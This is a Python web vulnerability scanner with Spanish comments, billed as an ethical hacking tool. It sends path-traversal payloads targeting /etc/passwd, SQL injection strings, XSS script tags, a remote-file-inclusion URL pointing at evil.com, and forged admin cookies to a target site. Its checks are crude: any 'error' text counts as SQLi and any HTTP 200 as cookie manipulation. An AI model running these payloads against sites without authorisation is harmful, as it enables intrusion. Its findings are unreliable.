import argparse
import requests
import socket
from colorama import Fore, init
from tqdm import tqdm

# Inicializar colorama para imprimir en color en la consola
init(autoreset=True)

# Banner de WebProbe
def banner():
    print(Fore.RED + "                                  ")
    print(Fore.RED + "Creado por Hacker Gold H")
    print(Fore.RED + "                                          ")
    print(Fore.BLUE + " _____   _                 __        __   _           ")
    print(Fore.BLUE + "|  ___| | |                \ \      / /  | |          ")
    print(Fore.BLUE + "| |__  _| |_ _ __ ___   __ _\ \    / /_ _| |_    ___  ")
    print(Fore.BLUE + "|  __||__ __| '_ ` _ \ / _` |\ \  / / _` | '_ \ / _ \ ")
    print(Fore.BLUE + "| |___  | |_| | | | | | (_| | \ \/ / (_| | |_) |  __/ ")
    print(Fore.BLUE + "|_____|  \__|_| |_| |_|\__,_|  \__/ \__,_|_.__/ \___|")
    print(Fore.BLUE + "\nEtma Vabe - Herramienta de Hacking Ético\n")

# Función para detectar la vulnerabilidad de LFI (Local File Inclusion)
def detectar_lfi(url):
    payloads = ['../etc/passwd', '../../etc/passwd', '../../../etc/passwd']
    for payload in payloads:
        test_url = url + '/' + payload
        response = requests.get(test_url)
        if 'root:' in response.text:
            print(Fore.RED + "[!] Vulnerabilidad LFI detectada:", test_url)
            print(Fore.YELLOW + "Detalles:")
            print(Fore.YELLOW + "- Se ha detectado una vulnerabilidad de Local File Inclusion (LFI) en el sitio web.")
            print(Fore.YELLOW + "- Esto podría permitir a un atacante acceder a archivos sensibles del servidor.")
            print(Fore.YELLOW + "- Se recomienda revisar y corregir la configuración del sitio para evitar esta vulnerabilidad.")

# Función para detectar la vulnerabilidad de SQLi (SQL Injection)
def detectar_sqli(url):
    payloads = ["' OR '1'='1", "' OR '1'='2"]
    for payload in payloads:
        test_url = url + '/' + payload
        response = requests.get(test_url)
        if 'error' in response.text:
            print(Fore.RED + "[!] Vulnerabilidad SQLi detectada:", test_url)
            print(Fore.YELLOW + "Detalles:")
            print(Fore.YELLOW + "- Se ha detectado una vulnerabilidad de SQL Injection (SQLi) en el sitio web.")
            print(Fore.YELLOW + "- Esto podría permitir a un atacante ejecutar comandos SQL no autorizados en la base de datos.")
            print(Fore.YELLOW + "- Se recomienda utilizar consultas parametrizadas o mecanismos de filtrado de entrada para prevenir esta vulnerabilidad.")

# Función para detectar la vulnerabilidad de XSS (Cross-Site Scripting)
def detectar_xss(url):
    payloads = ['<script>alert("XSS")</script>', '<img src="x" onerror="alert(\'XSS\')">']
    for payload in payloads:
        test_url = url + '/' + payload
        response = requests.get(test_url)
        if payload in response.text:
            print(Fore.RED + "[!] Vulnerabilidad XSS detectada:", test_url)
            print(Fore.YELLOW + "Detalles:")
            print(Fore.YELLOW + "- Se ha detectado una vulnerabilidad de Cross-Site Scripting (XSS) en el sitio web.")
            print(Fore.YELLOW + "- Esto podría permitir a un atacante inyectar y ejecutar código malicioso en el navegador de los usuarios.")
            print(Fore.YELLOW + "- Se recomienda implementar medidas de validación y escape de datos para prevenir esta vulnerabilidad.")

# Función para detectar la vulnerabilidad de RFI (Remote File Inclusion)
def detectar_rfi(url):
    payloads = ['http://www.evil.com/malicious_script']
    for payload in payloads:
        test_url = url + '/' + payload
        response = requests.get(test_url)
        if 'evil_content' in response.text:
            print(Fore.RED + "[!] Vulnerabilidad RFI detectada:", test_url)
            print(Fore.YELLOW + "Detalles:")
            print(Fore.YELLOW + "- Se ha detectado una vulnerabilidad de Remote File Inclusion (RFI) en el sitio web.")
            print(Fore.YELLOW + "- Esto podría permitir a un atacante incluir archivos remotos maliciosos en el sitio.")
            print(Fore.YELLOW + "- Se recomienda validar y filtrar adecuadamente las entradas para evitar esta vulnerabilidad.")

# Función para detectar la vulnerabilidad de manipulación de cookies (Cookie Manipulation)
def detectar_cookie_manipulation(url):
    cookies = {
        'admin': 'true',
        'user': 'admin'
    }
    response = requests.get(url, cookies=cookies)
    if response.status_code == 200:
        print(Fore.RED + "[!] Vulnerabilidad de manipulación de cookies detectada:", url)
        print(Fore.YELLOW + "Detalles:")
        print(Fore.YELLOW + "- Se ha detectado una vulnerabilidad de manipulación de cookies en el sitio web.")
        print(Fore.YELLOW + "- Esto podría permitir a un atacante obtener acceso no autorizado o realizar acciones en nombre del usuario legítimo.")
        print(Fore.YELLOW + "- Se recomienda revisar y fortalecer las políticas de seguridad relacionadas con las cookies.")

# Función para obtener la IP del usuario
def obtener_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

# Función para comprobar la instalación de las librerías necesarias
def comprobar_librerias():
    librerias = ['argparse', 'requests', 'colorama', 'tqdm', 'socket']
    librerias_faltantes = []
    for libreria in librerias:
        try:
            __import__(libreria)
        except ImportError:
            librerias_faltantes.append(libreria)
    if librerias_faltantes:
        print(Fore.YELLOW + "Advertencia: Faltan las siguientes librerías requeridas:")
        for libreria in librerias_faltantes:
            print(Fore.YELLOW + "- " + libreria)
    else:
        print(Fore.GREEN + "Todas las librerías requeridas están instaladas.")

# Función principal del programa
def main():
    banner()
    comprobar_librerias()
    
    parser = argparse.ArgumentParser(description='WebProbe - Herramienta de Hacking Ético')
    parser.add_argument('url', type=str, help='URL del sitio web a escanear')
    args = parser.parse_args()

    print(Fore.YELLOW + "\nInformación del Usuario:")
    print(Fore.YELLOW + "- IP del Usuario:", obtener_ip())

    print(Fore.BLUE + "\n***** Escaneo de Vulnerabilidades *****\n")

    detectar_lfi(args.url)
    detectar_sqli(args.url)
    detectar_xss(args.url)
    detectar_rfi(args.url)
    detectar_cookie_manipulation(args.url)

if __name__ == '__main__':
    main()
